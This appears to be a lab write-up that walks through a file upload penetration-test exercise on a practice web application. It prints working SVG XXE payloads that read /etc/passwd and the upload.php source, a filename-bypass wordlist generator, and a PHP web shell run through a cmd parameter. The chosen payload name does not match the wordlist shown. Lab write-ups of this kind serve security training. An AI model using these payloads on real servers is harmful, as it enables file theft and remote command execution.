# Skills Assessment

#### You are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.

Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.

***



For this Skills Assessment we have a web application with some default content, and we have to test the upload screenshot feature to test if there is any vulnerability.

<figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

The main focus of this assessment is this page. We can access it by clicking in **Contact Us**. To capture the essential requests we don't need to actually submit the data, just press the green and black button above.

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

The POST Request should look something like this. And as we can see from the Response, we don't have  an actual storage location of the image.

Since we got a **base64** encoded string from the Response, we can try if we can retrieve the upload.php script from the server, and see where the images are being saved.

<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Just by modifying the filename with a **.svg** extension we can execute XML code on the backend. Fortunately the the application does not have any protection to this and as we can see from the output above we manage to get the /etc/passwd with this code:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
```

<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Since we confirmed the web application is vulnerable to XXE, we can use this to read the web application's source files:

{% code overflow="wrap" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```
{% endcode %}

Now all we have to do is decode the **base64** string and hope that we got the source code of the upload.php file.

We can use the following command to do it:

```bash
echo "base64_string" | base64 --decode
```

<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>

We manage to read the **upload.php** script! The **$target\_dir** indicates where the images are being saved. Also notice that the **$fileName** gives us an important information, the dog.jpeg is renamed to **currentdate\_dog.jpeg** once gets uploaded to the server. This important in order to try to reach the image.

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

And we manage to get the actual image URL. It should look something like this:

**`http://SERVER_IP:PORT/contact/hiddenpath/currentdate_filename.ext`**

\
Now lets try to bypass any image upload filtering.

<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

We can use the same request used previously, we send it to the Intruder and made the following changes:

Add the selection to the filename

Keep the **ÿØÿà** - this is the ÿØÿà that will make the server read the content as a jpg file

Add the \<?php echo "shell test";?> to test the code execution

Create a word list with the following code:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do                      
    for ext in '.jpeg' '.jpg'; do
        echo "shell$char$ext.svg" >> wordlist.txt
        echo "shell$ext$char.svg" >> wordlist.txt
        echo "shell.svg$char$ext" >> wordlist.txt
        echo "shell.svg$ext$char" >> wordlist.txt
    done
done
```

Lastly, make sure to disable URL encoding and launch the attack.

<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

With this Request format we should look to the ones with a lenght over 366. In this case we select the **shell.phar:.jpg**.



<figure><img src="../../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

And the PHP code was executed!

<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Now, lets send the same Request to the Repeater and make an actual shell.&#x20;

Add the **shell.phar:.jpg** to the filename and `<?php system($_REQUEST['cmd']); ?>` after the **ÿØÿà** signature and send it!

<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

We add the **?cmd=id** to the URL and we are able to successfully execute a command!

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Now we just have fun wandering around to look for the flag and eventually made it!

